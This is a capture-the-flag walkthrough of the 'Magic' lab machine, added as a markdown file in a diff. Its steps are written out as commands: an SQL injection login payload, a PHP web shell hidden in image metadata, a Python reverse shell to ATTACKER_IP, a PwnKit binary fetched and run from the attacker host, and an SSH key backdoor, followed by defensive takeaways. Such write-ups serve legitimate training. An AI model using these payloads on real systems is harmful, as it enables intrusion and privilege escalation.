@@ -1,0 +1,344 @@
+````markdown
+# MAGIC – Linux Full Walkthrough
+
+> ⚠️ **Disclaimer**  
+> This walkthrough was performed in a controlled lab environment with full authorization.  
+> All actions are for **educational and defensive security purposes only**.
+
+---
+
+## 🧭 Overview
+
+* **Target**: Magic
+* **OS**: Linux (Ubuntu 18.04)
+* **Goal**: Web → User → Root compromise
+* **Techniques used**:
+  * Network & Web Enumeration
+  * SQL Injection Login Bypass
+  * File Upload Bypass (Double Extension + EXIF)
+  * Reverse Shell
+  * Credential Discovery (Database File)
+  * Privilege Escalation via PwnKit (pkexec)
+  * SSH Persistence
+  * MySQL Credential Dump (Alternative Privesc)
+
+---
+
+## 1️⃣ Enumeration
+
+### 🔍 Network & Service Discovery
+
+```bash
+nmap -sV -sC -Pn -v 10.129.5.16
+````
+
+**Key Findings**
+
+* **22/tcp – SSH** → OpenSSH 7.6p1 Ubuntu
+* **80/tcp – HTTP** → Apache 2.4.29 Ubuntu
+* Website Title: **Magic Portfolio**
+
+This indicates a **Linux web server with a custom web application**.
+
+---
+
+### 🔎 UDP Scan
+
+```bash
+nmap -sU --top-ports 500 10.129.5.16
+```
+
+Nothing critical discovered, but confirms additional open UDP services.
+
+---
+
+## 2️⃣ Web Enumeration
+
+### Nikto
+
+```bash
+nikto -h http://10.129.5.16
+```
+
+Server confirmed:
+
+```
+Apache/2.4.29 (Ubuntu)
+```
+
+---
+
+### Directory Bruteforce
+
+```bash
+gobuster dir -u http://10.129.5.16 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -r
+```
+
+**Findings**
+
+* `/assets`
+* `/server-status` (403)
+
+---
+
+### PHP Extension Bruteforce
+
+```bash
+gobuster dir -u http://10.129.5.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php
+```
+
+**Important Endpoints**
+
+* `/login.php`
+* `/upload.php`
+* `/index.php`
+* `/logout.php`
+* `/images`
+
+---
+
+## 3️⃣ Login Bypass – SQL Injection
+
+Login page:
+
+```
+http://10.129.5.16/login.php
+```
+
+The login form uses **JavaScript validation only**, making it vulnerable to SQL injection.
+
+### References
+
+* [https://book.hacktricks.wiki/en/pentesting-web/login-bypass/sql-login-bypass.html](https://book.hacktricks.wiki/en/pentesting-web/login-bypass/sql-login-bypass.html)
+* [https://www.youtube.com/watch?v=JkJLZ4NYISQ](https://www.youtube.com/watch?v=JkJLZ4NYISQ)
+
+### BurpSuite Intruder
+
+Payload used:
+
+```text
+username: ' or 1 or '
+password: admin
+```
+
+Indicators of success:
+
+* **HTTP 302 redirect**
+* Response length difference
+
+We now gain access to the **image upload panel**.
+
+---
+
+## 4️⃣ File Upload Bypass – Web Shell
+
+The upload form restricts file types, but validation is weak.
+
+### Technique
+
+* Use **double extension**
+* Inject PHP payload inside image metadata
+
+### References
+
+* [https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Reverse-Shell-via-JPG.md](https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Reverse-Shell-via-JPG.md)
+* [https://medium.com/@onurinalkac/hack-the-box-magic-writeup-4346e961e06f](https://medium.com/@onurinalkac/hack-the-box-magic-writeup-4346e961e06f)
+
+### Steps
+
+1. Create a JPG file
+2. Embed PHP shell using `exiftool`
+3. Rename file:
+
+```
+shell.php.jpg
+```
+
+Upload succeeds.
+
+---
+
+## 5️⃣ Reverse Shell
+
+### Listener (Attacker)
+
+```bash
+nc -lvnp 4443
+```
+
+### Trigger via Browser / Burp Repeater
+
+Encoded GET:
+
+```http
+GET /images/uploads/lo.php.jpg?cmd=python3+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("ATTACKER_IP",4443))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'
+```
+
+Upgrade shell:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+We now have a shell as:
+
+```
+www-data
+```
+
+---
+
+## 6️⃣ Post-Exploitation Enumeration
+
+### System Info
+
+```bash
+uname -a
+```
+
+Ubuntu 18.04 Kernel 5.3 detected.
+
+---
+
+### SUID Enumeration
+
+```bash
+find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
+```
+
+**Interesting Binary**
+
+```
+/usr/bin/pkexec
+```
+
+Likely vulnerable to **PwnKit**.
+
+---
+
+## 7️⃣ Credential Discovery – Database File
+
+Inside web directory:
+
+```
+/var/www/Magic/db.php5
+```
+
+### Exfiltration Method
+
+On compromised machine:
+
+```bash
+python3 -m http.server 8080
+```
+
+On attacker machine:
+
+```bash
+wget http://10.129.5.16:8080/db.php5
+```
+
+### Credentials Found
+
+```php
+private static $dbUsername = 'theseus';
+private static $dbUserPassword = 'iamkingtheseus';
+```
+
+---
+
+## 8️⃣ Privilege Escalation – PwnKit (Fast Method)
+
+### Reference
+
+* [https://github.com/ly4k/PwnKit/blob/main/PwnKit](https://github.com/ly4k/PwnKit/blob/main/PwnKit)
+
+### Attacker Machine
+
+```bash
+sudo python3 -m http.server 443
+```
+
+### Target Machine
+
+```bash
+wget http://ATTACKER_IP:443/PwnKit
+chmod +x PwnKit
+./PwnKit
+```
+
+**Result**
+
+```
+root@ubuntu
+```
+
+🎯 **Root Access Achieved**
+
+---
+
+## 9️⃣ Persistence – SSH Backdoor
+
+### Attacker Machine
+
+```bash
+ssh-keygen
+cat ~/.ssh/id_rsa.pub
+```
+
+### Target Machine
+
+```bash
+mkdir ~/.ssh
+echo "PUBLIC_KEY" > ~/.ssh/authorized_keys
+```
+
+Access:
+
+```bash
+ssh root@10.129.5.16
+```
+
+---
+
+## 🔟 Alternative Privilege Escalation – MySQL Dump
+
+Reference Write-Up:
+
+* [https://medium.com/@onurinalkac/hack-the-box-magic-writeup-4346e961e06f](https://medium.com/@onurinalkac/hack-the-box-magic-writeup-4346e961e06f)
+
+### Dump Database
+
+```bash
+mysqldump --user=theseus --password=iamkingtheseus --host=localhost Magic
+```
+
+**Recovered**
+
+```sql
+INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
+```
+
+This can be reused for lateral movement or further access.
+
+---
+
+## 🛡️ Defensive Takeaways
+
+* Never rely on client-side validation for logins
+* Enforce strict file upload validation
+* Disable double extensions
+* Restrict EXIF metadata execution
+* Patch pkexec (PwnKit vulnerability)
+* Protect database configuration files
+* Monitor `/var/www` for exposed credentials
+
+---
+
+## 🏁 Conclusion
+
+The **Magic** machine demonstrates how a chain of **small web misconfigurations** — SQL injection, weak upload validation, and exposed credentials — can quickly lead to **full root compromise**.
+No zero-days were required, only **enumeration, logic flaws, and privilege escalation techniques**.
+
+```
+```
